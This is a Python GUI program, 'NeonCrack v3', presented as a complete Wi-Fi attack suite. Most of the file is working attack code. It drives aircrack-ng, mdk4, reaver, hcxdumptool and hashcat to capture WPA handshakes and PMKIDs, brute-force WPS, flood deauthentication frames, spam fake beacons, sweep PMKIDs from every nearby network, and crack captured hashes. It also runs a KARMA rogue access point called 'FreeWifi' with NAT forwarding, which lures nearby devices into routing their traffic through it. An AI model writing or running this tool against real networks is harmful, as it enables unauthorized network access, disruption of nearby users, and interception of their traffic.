#!/usr/bin/env python3
"""
NeonCrack v3 – full Wi-Fi attack suite
--------------------------------------


"""
# ---------- std-lib imports ----------
import os, subprocess, threading, csv, time, signal, shutil, sys, re
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog

# ---------- UI palette ----------
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT = ("Courier New", 11)
CAP_DIR = "neoncrack_captures"; os.makedirs(CAP_DIR, exist_ok=True)

# ---------- interface whitelist ----------
WHITELIST = {"wlan0", "wlan1"}   # add/remove your adapter names.  empty → show all

root = Tk(); root.title("NeonCrack v3"); root.configure(bg=BGC); root.geometry("1080x820")

# ---------- Tk variables ----------
iface_var, target_var = StringVar(), StringVar()
scan_time            = IntVar(value=45)
pcap_var, word_var   = StringVar(), StringVar()
hash_input           = StringVar()

attack_proc  = None      # running external tool
monitor_flag = False
networks     = []        # scan results

# ---------- helper utils ----------
def run(cmd, outfile=None):
    f = open(outfile,"wb") if outfile else subprocess.DEVNULL
    return subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT,
                            preexec_fn=os.setsid)

def run_logged(cmd, widget, outfile=None):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                         text=True, bufsize=1, universal_newlines=True,
                         preexec_fn=os.setsid)
    def pump():
        with open(outfile,"a") if outfile else open(os.devnull,"w") as fh:
            for line in p.stdout:
                widget.insert(END,line); widget.see(END); fh.write(line)
    threading.Thread(target=pump, daemon=True).start()
    return p

def log(w, txt): w.insert(END, txt+"\n"); w.see(END); w.update()

def iw_interfaces():
    try:
        out=subprocess.check_output(["iw","dev"], text=True)
        all_if=[l.split()[1] for l in out.splitlines() if l.strip().startswith("Interface")]
        return [i for i in all_if if not WHITELIST or i in WHITELIST]
    except subprocess.CalledProcessError: return []

def set_monitor(iface, enable=True):
    global monitor_flag
    if not iface: return
    subprocess.run(["airmon-ng","start" if enable else "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_var.set(iface+"mon" if enable and not iface.endswith("mon")
                  else iface.replace("mon",""))
    monitor_flag = enable
    refresh_iface_menu()

def refresh_iface_menu():
    if 'iface_menu' not in globals(): return
    m=iface_menu["menu"]; m.delete(0,"end")
    for i in iw_interfaces():
        m.add_command(label=i, command=lambda v=i: iface_var.set(v))

# ---------- NAT helpers for KARMA ----------
def enable_nat(uplink_if, ap_if):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink_if,"-j","MASQUERADE"])
    subprocess.run(["iptables","-A","FORWARD","-i",uplink_if,"-o",ap_if,
                    "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"])
    subprocess.run(["iptables","-A","FORWARD","-i",ap_if,"-o",uplink_if,"-j","ACCEPT"])

def disable_nat():
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["iptables","-F"])
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL)

# ---------- watchdog (10-min) ----------
def watchdog():
    global attack_proc
    while True:
        time.sleep(600)
        if attack_proc and attack_proc.poll() is not None:   # died but not cleared
            try: os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
            except Exception: pass
            attack_proc=None
threading.Thread(target=watchdog, daemon=True).start()

# ---------- scan helpers ----------
def parse_csv(path):
    nets=[]
    with open(path,newline='') as f:
        for r in csv.reader(f):
            if len(r)>13 and r[0] and r[0]!="BSSID":
                bssid=r[0].strip().upper(); ch=r[3].strip()
                enc=r[5].strip(); essid=r[13].strip() or "<hidden>"
                nets.append((bssid,ch,essid,enc))
    return nets

def detect_wps(mon, chans, dwell=3):
    hits=set()
    for ch in sorted(set(chans)):
        try:
            out=subprocess.check_output(
                ["timeout",str(dwell),"wash","-i",mon,"-c",ch,
                 "--ignore-fcs","-s","-g","--rx-timeout","1"],
                text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m=re.match(r"([0-9A-Fa-f:]{17})", line)
                if m: hits.add(m.group(1).upper())
        except subprocess.CalledProcessError: continue
    log(scan_out,f"[*] WPS sniff → {len(hits)} flagged")
    return hits

# ---------- scanning ----------
def do_scan(channel_hop=False):
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Choose iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    fn=os.path.join(CAP_DIR,f"scan_{'hop' if channel_hop else 'dwell'}_{datetime.now():%Y%m%d_%H%M%S}")
    cmd=["airodump-ng","-w",fn,"--output-format","csv"]
    if not channel_hop: cmd+=["-c","1,6,11"]; cmd.append(mon)
    p=run_logged(cmd,scan_out); log(scan_out,"[*] scanning…"); time.sleep(scan_time.get()); p.terminate(); time.sleep(2)
    csvp=fn+"-01.csv"
    if not os.path.isfile(csvp): log(scan_out,"[!] CSV missing"); set_monitor(mon,False); return
    base=parse_csv(csvp); wps=detect_wps(mon,[n[1] for n in base])
    global networks; networks=[]
    scan_out.insert(END,"# |      BSSID       | CH | ENC | WPS | ESSID\n"+"-"*72+"\n")
    for idx,(bssid,ch,essid,enc) in enumerate(base,1):
        flag="Y" if bssid in wps else "-"
        networks.append((bssid,ch,essid,enc,flag))
        scan_out.insert(END,f"{idx:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")
    target_menu["menu"].delete(0,"end")
    for idx,(_,_,essid,_,_) in enumerate(networks,1):
        target_menu["menu"].add_command(label=f"{idx} – {essid}", command=lambda v=str(idx): target_var.set(v))
    log(scan_out,f"[+] {len(networks)} nets."); set_monitor(mon,False)

# ---------- attack helpers ----------
def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target","Select a network"); return None
    return networks[int(target_var.get())-1]

# ---------- handshake auto-stop ----------
def handshake_monitor(cap,bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out=subprocess.check_output(["aircrack-ng","-a","2","-w","/dev/null","-b",bssid,cap],
                                        text=True,stderr=subprocess.DEVNULL,timeout=20)
            if "handshake" in out.lower():
                log(att_out,"[+] handshake found – stopping"); os.killpg(os.getpgid(attack_proc.pid),signal.SIGTERM)
                attack_proc=None; set_monitor(iface_var.get(),False); return
        except subprocess.TimeoutExpired: pass
        time.sleep(15)

# ---------- standard attacks ----------
def start_pmkid():
    t=pick_target(); iface=iface_var.get(); 
    if not t:return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc; attack_proc=run_logged(["hcxdumptool","-i",mon,"--filterlist_ap",bssid,"--enable_status=1"],
                                              att_out, pcap)
    log(att_out,f"[*] PMKID → {pcap}")

def start_handshake():
    t=pick_target(); iface=iface_var.get();
    if not t:return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    prefix=os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc; attack_proc=run_logged(["airodump-ng","-c",ch,"--bssid",bssid,"-w",prefix,mon],
                                              att_out, prefix+".log")
    run(["aireplay-ng","-0","10","-a",bssid,mon]).wait()
    threading.Thread(target=handshake_monitor,args=(prefix+"-01.cap",bssid),daemon=True).start()

def start_wps():
    t=pick_target(); iface=iface_var.get(); 
    if not t:return
    bssid,ch,essid,_,_=t
    set_monitor(iface,True); mon=iface_var.get()
    tool="reaver" if shutil.which("reaver") else "bully"
    cmd=["reaver","-i",mon,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" \
        else ["bully","-b",bssid,"-c",ch,mon]
    logf=os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logf)
    log(att_out,f"[*] {tool} WPS started – log {logf}")

# ---------- disruption attacks ----------
def start_deauth():
    t=pick_target(); iface=iface_var.get(); 
    if not t:return
    bssid,_,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    if shutil.which("mdk4"): cmd=["mdk4",mon,"d","-B",bssid]; tag="mdk4-deauth"
    else: cmd=["aireplay-ng","--deauth","0","-a",bssid,mon]; tag="aireplay-deauth"
    logf=os.path.join(CAP_DIR,f"{tag}_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf)
    log(att_out,"[*] Deauth flood running – Stop to end")

def start_beacon():
    iface=iface_var.get()
    if not shutil.which("mdk4"):
        messagebox.showerror("mdk4","install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    ssidlist=os.path.join(CAP_DIR,f"ssid_{int(time.time())}.txt")
    with open(ssidlist,"w") as f:[f.write(f"neon-{i:03}\n") for i in range(100)]
    global attack_proc; attack_proc=run_logged(
        ["mdk4",mon,"b","-f",ssidlist,"-c","1,6,11"], att_out, ssidlist+".log")
    log(att_out,"[*] Beacon spam – Stop to end")

# ---------- mass PMKID ----------
def start_mass_pmkid():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Choose iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_sweep_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    global attack_proc; attack_proc=run_logged(
        ["hcxdumptool","-i",mon,"--enable_status=15","-o",pcap], att_out, pcap)
    def auto_conv():
        while attack_proc and attack_proc.poll() is None:
            hccap=pcap.replace(".pcapng",f"_{int(time.time())}.hccapx")
            run(["hcxpcapngtool","-o",hccap,pcap]).wait()
            log(att_out,f"[+] PMKID batch → {hccap}"); time.sleep(300)
    threading.Thread(target=auto_conv, daemon=True).start()
    log(att_out,"[*] Mass PMKID sweep – Stop to end")

# ---------- KARMA rogue AP ----------
def start_karma():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Choose iface"); return
    uplink=simpledialog.askstring("Uplink NIC","Outbound interface (e.g., eth0)",parent=root)
    if not uplink: return
    set_monitor(iface,True); mon=iface_var.get()
    enable_nat(uplink, mon)
    if shutil.which("hostapd-mana"):
        cfg=os.path.join(CAP_DIR,"mana.conf")
        open(cfg,"w").write(f"interface={mon}\ndriver=nl80211\nssid=FreeWifi\n")
        cmd=["hostapd-mana",cfg]; tag="mana-karma"
    else:
        cmd=["airbase-ng","-P","-C","30","-v","FreeWifi",mon]; tag="airbase-karma"
    logf=os.path.join(CAP_DIR,f"{tag}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd, att_out, logf)
    log(att_out,"[*] KARMA rogue-AP running – Stop to end")

# ---------- stop / reset ----------
def stop_attack():
    global attack_proc
    disable_nat()
    if attack_proc:
        try: os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        except Exception: pass
        attack_proc=None
    if monitor_flag: set_monitor(iface_var.get(),False)
    log(att_out,"[!] Attack stopped.")

def reset_toolkit(exit_after=False):
    stop_attack()
    for svc in ("NetworkManager","wpa_supplicant"):
        subprocess.run(["systemctl","restart",svc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for box in (scan_out,att_out,crack_out,hashid_out,cleaner_out,stats_out): box.delete("1.0",END)
    for v in (target_var,pcap_var,word_var,hash_input,iface_var): v.set("")
    refresh_iface_menu(); log(scan_out,"[*] Toolkit reset. services up.")
    if exit_after: root.quit()

# ---------- cracking & utils ----------
def browse_pcap(): pcap_var.set(filedialog.askopenfilename(filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))
def browse_word(): word_var.set(filedialog.askopenfilename(filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl): messagebox.showwarning("Missing","select files"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx"); run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"], crack_out)
    crack_out.insert(END,"[*] hashcat started …\n")

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],text=True,stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")
def hashid_action(): h=hash_input.get().strip(); hashid_out.delete("1.0",END); hashid_out.insert(END,identify_hash(h)+"\n") if h else None

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng"); run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    if not os.path.isfile(pot): stats_out.delete("1.0",END); stats_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    stats_out.delete("1.0",END); stats_out.insert(END,"Len|Count\n-----------\n")
    for l,c in sorted(dist.items()): stats_out.insert(END,f"{l:>3}|{c}\n")

# ---------- GUI layout ----------
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab",background="#1a1a1a",foreground=NEON,font=FONT,padding=8)

nb=ttk.Notebook(root); nb.pack(fill=BOTH,expand=True)
tabs={}
for k,lbl in [("scan","⚡ Scan"),("attack","⚔️ Attacks"),("crack","💥 Crack"),
              ("hash","🔎 Hash ID"),("clean","🧹 Cleaner"),("stats","📊 Stats")]:
    fr=Frame(nb,bg=BGC); nb.add(fr,text=lbl); tabs[k]=fr

# --- Scan tab ---
ts=tabs["scan"]; iface_menu=OptionMenu(ts, iface_var,*iw_interfaces()); iface_menu.pack(pady=4); refresh_iface_menu()
Button(ts,text="Enable Monitor",bg=ACCENT,fg="white",command=lambda:set_monitor(iface_var.get(),True)).pack(pady=2)
Button(ts,text="Disable Monitor",bg="#ff0030",fg="white",command=lambda:set_monitor(iface_var.get(),False)).pack(pady=2)
Spinbox(ts,from_=15,to=180,textvariable=scan_time,width=5).pack()
Button(ts,text="Focused Scan",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,daemon=True).start()).pack(pady=2)
Button(ts,text="Channel-Hop Scan",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,kwargs={'channel_hop':True},daemon=True).start()).pack(pady=2)
scan_out=scrolledtext.ScrolledText(ts,width=115,height=24,bg="#0d0d17",fg=NEON,font=("Consolas",10)); scan_out.pack()

# --- Attack tab ---
ta=tabs["attack"]; target_menu=OptionMenu(ta,target_var,""); target_menu.pack(fill=X,padx=10,pady=4)
for txt,fn in [("PMKID Capture",start_pmkid),("4-Way Handshake",start_handshake),
               ("WPS Bruteforce",start_wps),("Deauth Flood",start_deauth),
               ("Beacon Spam",start_beacon),("Mass-PMKID Sweep",start_mass_pmkid),
               ("KARMA Rogue-AP",start_karma)]:
    Button(ta,text=txt,bg=ACCENT,fg="white",command=fn).pack(fill=X,padx=20,pady=2)
Button(ta,text="Stop Attack",bg="#ff0030",fg="white",command=stop_attack).pack(fill=X,padx=20,pady=4)
att_out=scrolledtext.ScrolledText(ta,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); att_out.pack()

# --- Crack tab ---
tc=tabs["crack"]; Entry(tc,textvariable=pcap_var,width=85).pack(pady=2); Button(tc,text="Browse pcap",command=browse_pcap).pack()
Entry(tc,textvariable=word_var,width=85).pack(pady=2); Button(tc,text="Browse wordlist",command=browse_word).pack()
Button(tc,text="Start Crack",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=crack,daemon=True).start()).pack(pady=4)
crack_out=scrolledtext.ScrolledText(tc,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); crack_out.pack()

# --- Hash-ID tab ---
th=tabs["hash"]; Entry(th,textvariable=hash_input,width=85).pack(pady=4); Button(th,text="Identify Hash",command=hashid_action,bg=ACCENT,fg="white").pack()
hashid_out=scrolledtext.ScrolledText(th,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); hashid_out.pack()

# --- Cleaner tab ---
cl=tabs["clean"]; Button(cl,text="Select & Clean pcapng",command=clean_capture,bg=ACCENT,fg="white").pack(pady=4)
cleaner_out=scrolledtext.ScrolledText(cl,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); cleaner_out.pack()

# --- Stats tab ---
st=tabs["stats"]; Button(st,text="Refresh Stats",command=show_stats,bg=ACCENT,fg="white").pack(pady=4)
stats_out=scrolledtext.ScrolledText(st,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); stats_out.pack()

# --- Reset tab ---
re=Frame(nb,bg=BGC); nb.add(re,text="♻️ Reset")
Button(re,text="Reset NeonCrack",width=30,bg=ACCENT,fg="white",command=lambda:reset_toolkit(False)).pack(pady=12)
Button(re,text="Reset & Exit",width=30,bg="#ff0030",fg="white",command=lambda:reset_toolkit(True)).pack()

# ---------- launch ----------
if __name__=="__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run NeonCrack with sudo."); sys.exit(1)
    root.mainloop()